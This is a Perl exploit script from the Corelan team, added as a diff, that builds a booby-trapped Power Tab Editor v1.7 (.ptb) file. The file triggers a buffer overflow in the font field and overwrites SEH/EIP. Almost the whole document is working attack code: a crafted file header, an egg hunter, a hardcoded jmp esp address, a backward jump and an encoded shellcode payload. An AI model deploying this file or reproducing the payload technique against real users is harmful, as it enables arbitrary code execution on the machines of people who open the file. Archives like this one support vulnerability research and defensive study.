@@ -1,0 +1,91 @@
+#***********************************************************************************
+# Exploit Title : Power Tab Editor v1.7 (Build 80)
+# Date          : 07/06/2010
+# Author        : Sud0
+# Bug found by  : Sud0
+# Software Link : http://www.power-tab.net/guitar.php
+# Version       : v1.7 (Build 80)
+# OS            : Windows
+# Tested on     : XP SP3 En (VirtualBox)
+# Type of vuln  : EIP / SEH
+# Thanks to my wife for her support
+# Congratz to markot for his new baby Manuel
+# Greetz to: Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# Corelan does not want anyone to use this script
+# for malicious and/or illegal purposes
+# Corelan cannot be held responsible for any illegal use.
+#
+# Note : you are not allowed to edit/modify this code. 
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+#***********************************************************************************
+#code :
+print "|------------------------------------------------------------------|\n";
+print "|                         __               __                      |\n";
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
+print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
+print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
+print "|                                                                  |\n";
+print "|                                       http://www.corelan.be:8800 |\n";
+print "|                                                                  |\n";
+print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
+print "[+] Exploit for Power Tab Editor v1.7 b80\n";
+
+my $filename="poc.ptb";
+my $junk = "\x20" x 463;
+my  $footer =     "\x08\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0F". 
+    "\x54\x69\x6D\x65\x73\x20\x4E\x65\x77\x20\x52\x6F\x6D\x61\x6E\x08". 
+    "\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0F\x54". 
+    "\x69\x6D\x65\x73\x20\x4E\x65\x77\x20\x52\x6F\x6D\x61\x6E\x08\x00". 
+    "\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00". 
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+my $egg=     "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
+
+my 	$buffer  = "ptab" . "\x04\x00\x00\x00\xFF\xCF\x01"; 			# File Header
+	
+	$buffer .= $junk ; 
+	$buffer .=    "\x00\x00\x02\x00\xDA\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x00\x01\x00\xFF\xFF\x01\x00\x07\x00\x43\x47\x75\x69\x74\x61\x72" ; # basic config for ptb file
+	$buffer .=    "\x00\x08\x55\x6E\x74\x69\x74\x6C\x65\x64\x18\x68\x40\x00\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x00\x00\x08\x53\x74\x61\x6E\x64\x61\x72\x64\x01\x06\x40\x3B\x37" ; # basic config for ptb file
+	$buffer .=    "\x32\x2D\x28\x00\x00\x00\x00\x01\x00\xFF\xFF\x01\x00\x09\x00\x43" ; # basic config for ptb file
+	$buffer .=    "\x47\x75\x69\x74\x61\x72\x49\x6E\x00\x00\x00\x00\x00\x01\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x00\x00\x00\x00\x01\x00\xFF\xFF\x01\x00\x08\x00\x43\x53\x65\x63" ; # basic config for ptb file
+	$buffer .=    "\x74\x69\x6F\x6E\x32\x00\x00\x00\x14\x00\x00\x00\x20\x03\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x8F\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x10\x00\x80\x11\x1A" ; # basic config for ptb file
+	$buffer .=    "\x04\x7F\x00\x00\x00\x00\x00\x00\x00\x01\x00\xFF\xFF\x01\x00\x06" ; # basic config for ptb file
+	$buffer .=    "\x00\x43\x53\x74\x61\x66\x66\x06\x09\x09\x11\x00\x00\x00\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x00\x00\x01\x00\x01\x80\x00\x08\x55\x6E\x74\x69\x74\x6C\x65\x64" ; # basic config for ptb file
+	$buffer .=    "\x21\x68\x40\x00\x00\x00\x00\x00\x04\x42\x61\x73\x73\x01\x04\x2B" ; # basic config for ptb file
+	$buffer .=    "\x26\x21\x1C\x00\x00\x00\x00\x01\x00\x03\x80\x00\x00\x00\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x01\x00\x00\x00\x00\x00\x00\x01\x00\x05\x80\x32\x00\x00\x00\x14" ; # basic config for ptb file
+	$buffer .=    "\x00\x00\x00\x20\x03\x00\x00\x7D\x00\x00\x00\x00\x14\x00\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x00\x00\x10\x00\x80\x11\x1A\x04\x7F\x00\x00\x00\x00\x00\x00\x00" ; # basic config for ptb file
+	$buffer .=    "\x01\x00\x07\x80\x14\x09\x09\x11\x00\x00\x00\x00\x00\x00\x00\x05" ; # basic config for ptb file
+
+	$buffer .= "Arial" . "A" x 18;  	# Font here where the Buffer Overflow occures
+	$buffer .= $egg;
+	$buffer .= "A" x 18;			# some junk
+	$buffer .= "\xDC\x3A\xB4\x76";		# jmp esp from winmm.dll may be changed 
+	$buffer .= "\x90" x 4;			# somz NOPs
+	$buffer .= "\xEB\xC4" ;			# Jump Backward to egg bunter
+	$buffer .= "\xcc\x00\x36\x00";		# ptb file separator
+	$buffer .= "A" x 918;			# some junk
+	$buffer .= $footer;			# ptb file footer
+$shellcode = "w00tw00t" .  "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIhYjKMKn92Ta4kDDqXRX2qjp1KyPdLKqadpnkaf4LNkrVELLKsvUXnkcNgPnk6VvXroWhrUJSv931N1kOiqSPLKRLtd5tNkcuWLlKPTWupxvakZNkpJWhnkSjgP5QJKxcVW1YNkVTLKEQxnfQ9oP1kpylnLK4kpT4WzYQZoVm5Qjg9yZQKOyoKOEkqlVDQ81eknLK1JUtS1zKSVlKvlpKNkRzwlwqJKnk7tLKc1KXoyStQ4eLE1iSOBwxeyKdOyhelIKrQxlNRntNzLPRixMLiokOkONiRewtmkcNkhkRQcLGeL6D0RM8NkyokOKOniSu38qxPl2LUpkO58Ucp2fNqt3XSEt32ESBOxQLWTtJOyJFv6KOSeFdLIYRRpoKnHMr2mmlmWWlutpRkX3nKOkOkOqxPLQQBnPXu8csRoV2W5VQyKNh1LTdUWoyHcPh2USUBLbxsXUp0MU1pnsX3RrO2U2T2HROT45ppa3XPmsQSBu3QxUprTrOUp1x2RcQRT2ZqxU3bORNQwu8qcwPFZUpphGPpsQq493XRs2UQtvPEayYoxpLutVKMYHaFQKbqB63PQ629oJp6QIPBpYoruWxWzA";
+
+	$buffer .=$shellcode;
+
+print "Removing old $filename file\n";
+system("del $filename");
+print "Creating new $filename file\n";
+open(FILE, ">$filename");
+
+print FILE $buffer;
+close(FILE);
